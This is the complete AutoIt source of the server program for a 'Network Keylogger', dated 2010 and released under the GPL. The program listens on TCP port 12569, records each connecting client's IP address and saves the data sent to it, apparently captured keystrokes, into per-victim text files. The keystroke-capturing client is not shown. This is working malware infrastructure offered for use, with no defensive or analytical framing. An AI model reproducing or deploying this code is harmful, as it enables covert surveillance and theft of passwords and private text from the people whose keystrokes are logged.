#cs
	Network Keylogger Server - Server program for Network Keylogger
	Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net

	License information:

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
#ce

; Tested with AutoIt 3.3.6.0
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=vittgam.ico
#AutoIt3Wrapper_outfile=network_keylogger_server.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_Res_Comment=Network Keylogger Server v1.0 by VittGam
#AutoIt3Wrapper_Res_Description=Network Keylogger Server
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger_server
#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger Server
#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.0
#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger_server.exe
#AutoIt3Wrapper_Res_SaveSource=n
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Res_requestedExecutionLevel=asInvoker
#AutoIt3Wrapper_Au3Check_Parameters=-d -w 1 -w 2 -w 3 -w 4 -w 5 -w 6
#AutoIt3Wrapper_Au3Check_Stop_OnWarning=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

TCPStartup()
Global $MainSocket=TCPListen("0.0.0.0","12569")
If $MainSocket = -1 Then
	MsgBox(16,"Network Keylogger Server","Cannot initialize the server at 0.0.0.0:12569.")
	Exit
EndIf
If DirCreate(@ScriptDir&"\KeyloggerReceived") = 0 Then
	MsgBox(16,"Network Keylogger Server","Cannot create KeyloggerReceived folder: "&@ScriptDir&"\KeyloggerReceived.")
	Exit
EndIf
Global $ConnectedSocket=-1,$temp_filename="",$rnd=-1,$sockaddr=0,$aRet[1]=[0],$ip=0,$recv=""
TrayTip("Network Keylogger Server","Initialized, listening at 0.0.0.0:12569",60,17)
While 1
	Do
		$ConnectedSocket=TCPAccept($MainSocket)
	Until $ConnectedSocket <> -1
	$ip=0
	$sockaddr=DllStructCreate("short;ushort;uint;char[8]")
	$aRet=DllCall("Ws2_32.dll","int","getpeername","int",$ConnectedSocket,"ptr",DllStructGetPtr($sockaddr),"int*",DllStructGetSize($sockaddr))
	If Not @error And $aRet[0] = 0 Then
		$aRet=DllCall("Ws2_32.dll","str","inet_ntoa","int",DllStructGetData($sockaddr,3))
		If Not @error Then $ip=$aRet[0]
	EndIf
	$sockaddr=0
	$rnd=Random(1000000,9999999,1)
	$temp_filename=@ScriptDir&"\KeyloggerReceived\received-"&$ip&"-"&$rnd&".txt"
	TrayTip("Network Keylogger Server","New connection from "&$ip&"! Saving in file "&$temp_filename,60,17)
	While 1
		$recv=TCPRecv($ConnectedSocket,2048)
		If @error Then ExitLoop
		FileWrite($temp_filename,$recv)
		Sleep(750)
	WEnd
	If $ConnectedSocket <> -1 Then TCPCloseSocket($ConnectedSocket)
	TrayTip("Network Keylogger Server","Finished connection from "&$ip&", file saved as "&$temp_filename,60,17)
WEnd
TCPShutdown()
